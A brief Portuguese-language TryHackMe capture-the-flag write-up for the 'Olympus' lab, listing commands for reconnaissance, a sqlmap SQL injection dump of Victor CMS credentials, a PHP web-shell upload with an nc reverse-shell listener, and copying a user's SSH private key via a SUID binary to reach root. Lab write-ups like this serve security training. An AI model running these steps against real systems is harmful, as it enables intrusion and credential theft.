Olympus

TryHackMe · Medium by Brenno M.

Olympus explora uma SQL Injection no Victor CMS para extrair credenciais, encontra um subdomínio com um chat que permite upload de web shell, e escala privilégios abusando de um binário SUID que copia arquivos, chegando ao root via uma chave SSH e um script de privesc.

Reconhecimento

O Nmap revela SSH e HTTP. A enumeração encontra o diretório ~webmaster (Victor CMS) e um subdomínio chat.olympus.thm.

nmap -sS -sV -Pn <IP>
echo '<IP> olympus.thm chat.olympus.thm' | sudo tee -a /etc/hosts
gobuster dir -u http://olympus.thm/~webmaster/ -w big.txt

SQL Injection

A funcionalidade de busca do Victor CMS é vulnerável a SQLi. Com o sqlmap extrai-se o banco, revelando usuários (prometheus, zeus) e apontando para o chat.

sqlmap -r search.req --dbs
sqlmap -r search.req -D olympus --dump

Foothold - upload

No chat autenticado, sobe-se uma web shell PHP (o nome do arquivo enviado é registrado na tabela chats) e dispara-se a reverse shell.

# upload de shell.php via chat -> obter caminho do arquivo
curl http://.../uploads/<arquivo>.php
nc -lvnp 4444

Escalação de privilégios

Encontra-se um binário com SUID de zeus que copia arquivos; usa-se para copiar o id_rsa de zeus e logar por SSH. Um script PHP de privesc, executado conforme instruído, entrega o root.

find / -perm -4000 2>/dev/null
# binário SUID (zeus) -> copiar /home/zeus/.ssh/id_rsa
ssh -i id_rsa zeus@<IP>
# executar o script PHP de privesc indicado -> root
cat /root/root.txt
